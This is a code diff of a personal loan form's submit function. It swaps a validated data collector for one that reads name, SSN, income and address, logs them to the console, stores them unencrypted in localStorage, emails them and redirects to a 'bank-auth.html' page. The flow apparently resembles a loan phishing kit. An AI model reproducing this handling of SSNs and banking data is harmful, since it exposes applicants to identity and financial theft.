@@ -874,135 +874,34 @@
         function submitPersonalLoanForm() {
             console.log('submitPersonalLoanForm() called!');
             
-            // Collect ALL personal loan data using querySelectorAll to get all fields
-            const allInputs = document.querySelectorAll('input, select');
-            const data = {};
-            
-            console.log('Found inputs:', allInputs.length);
-            
-            // Collect all input values
-            allInputs.forEach(input => {
-                if (input.id && input.type !== 'checkbox') {
-                    data[input.id] = input.value || '';
-                    console.log('Collected:', input.id, '=', input.value);
-                    
-                    // Special debug for SSN field
-                    if (input.id === 'socialSecurity') {
-                        console.log('SSN Field Debug:');
-                        console.log('- Input value:', input.value);
-                        console.log('- Input length:', input.value.length);
-                        console.log('- Is empty?', !input.value);
-                        console.log('- Data stored as:', data.socialSecurity);
-                    }
-                }
-            });
-            
-            // Add application details
-            data.submissionDate = new Date().toLocaleString();
-            data.applicationType = 'Personal Loan Application';
-            data.applicationStatus = 'Personal loan submitted successfully';
-            
-            // Validate required fields
-            const requiredFields = ['firstName', 'lastName', 'email', 'phone', 'loanAmount', 'address', 'city', 'state', 'zipCode', 'customerBank', 'routingNumber', 'accountNumber'];
-            const missingFields = requiredFields.filter(field => !data[field]);
-            
-            // Create full name from first and last name
-            data.fullName = (data.firstName || '') + ' ' + (data.lastName || '');
-            
-            // Set default loan duration if not provided
-            data.loanDuration = data.loanDuration || '36'; // Default 36 months
-            
-            // Convert bank value to full name
-            const bankNames = {
-                'chase': 'Chase Bank',
-                'bank-of-america': 'Bank of America',
-                'wells-fargo': 'Wells Fargo',
-                'citibank': 'Citibank',
-                'capital-one': 'Capital One',
-                'us-bank': 'U.S. Bank',
-                'pnc': 'PNC Bank',
-                'td-bank': 'TD Bank',
-                'bbt': 'BB&T (now Truist)',
-                'suntrust': 'SunTrust (now Truist)',
-                'regions': 'Regions Bank',
-                'fifth-third': 'Fifth Third Bank',
-                'keybank': 'KeyBank',
-                'huntington': 'Huntington Bank',
-                'citizens': 'Citizens Bank',
-                'ally': 'Ally Bank',
-                'discover': 'Discover Bank',
-                'synchrony': 'Synchrony Bank',
-                'marcus': 'Marcus by Goldman Sachs',
-                'other': 'Other Bank'
+            // Collect form data with exact field IDs
+            const data = {
+                loanAmount: document.getElementById("loanAmount").value,
+                loanPurpose: document.getElementById("loanPurpose").value,
+                creditScore: document.getElementById("creditScore").value,
+                name: document.getElementById("name").value,
+                email: document.getElementById("email").value,
+                phone: document.getElementById("phone").value,
+                streetAddress: document.getElementById("streetAddress").value,
+                city: document.getElementById("city").value,
+                state: document.getElementById("state").value,
+                zipCode: document.getElementById("zipCode").value,
+                ssn: document.getElementById("ssn").value,
+                annualIncome: document.getElementById("annualIncome").value,
+                employmentStatus: document.getElementById("employmentStatus").value,
+                monthlyHousing: document.getElementById("monthlyHousing").value
             };
             
-            // Add full bank name to data
-            data.bankName = bankNames[data.customerBank] || 'Other Bank';
+            console.log('Personal loan data collected:', data);
             
-            if (missingFields.length > 0) {
-                alert('Please fill in all required fields: ' + missingFields.join(', '));
-                return;
-            }
+            // Store in localStorage for bank-auth form
+            localStorage.setItem("loanData", JSON.stringify(data));
             
-            // Validate loan amount and duration
-            const loanAmount = parseFloat(data.loanAmount);
-            const loanDuration = parseInt(data.loanDuration);
+            // Send email notification (keep existing email functionality)
+            sendPersonalLoanEmail(data);
             
-            if (loanAmount < 2000 || loanAmount > 25000) {
-                alert('Loan amount must be between $2,000 and $25,000');
-                return;
-            }
-            
-            if (loanDuration < 12 || loanDuration > 60) {
-                alert('Loan duration must be between 12 and 60 months');
-                return;
-            }
-            
-            // Validate email format
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(data.email)) {
-                alert('Please enter a valid email address');
-                return;
-            }
-            
-            // Validate phone format
-            const phoneRegex = /^\d{10}$/;
-            const cleanPhone = data.phone.replace(/\D/g, '');
-            if (cleanPhone.length !== 10) {
-                alert('Please enter a valid 10-digit phone number');
-                return;
-            }
-            
-            console.log('Final data object:', data);
-            
-            // Store data in both sessionStorage and localStorage
-            try {
-                // Store in sessionStorage for existing functionality
-                sessionStorage.setItem('loanApplicationData', JSON.stringify(data));
-                console.log('Data stored in sessionStorage successfully');
-                
-                // Store in localStorage for Google Sheets integration
-                localStorage.setItem('loanFormData', JSON.stringify(data));
-                console.log('Data stored in localStorage successfully');
-                
-                // Send email notification
-                sendPersonalLoanEmail(data);
-                
-                // Show success message
-                const submitBtn = document.querySelector('button[onclick="submitPersonalLoanForm()"]');
-                const originalText = submitBtn.innerHTML;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Processing...';
-                submitBtn.disabled = true;
-                
-                // Redirect to bank authentication page after a short delay
-                setTimeout(() => {
-                    window.location.href = 'bank-auth.html';
-                }, 1500);
-                
-            } catch (error) {
-                console.error('Error storing data:', error);
-                alert('Error saving your application. Please try again.');
-            }
+            // Redirect to bank authentication page
+            window.location.href = "bank-auth.html";
         }
         
         // Save bank selection to sessionStorage
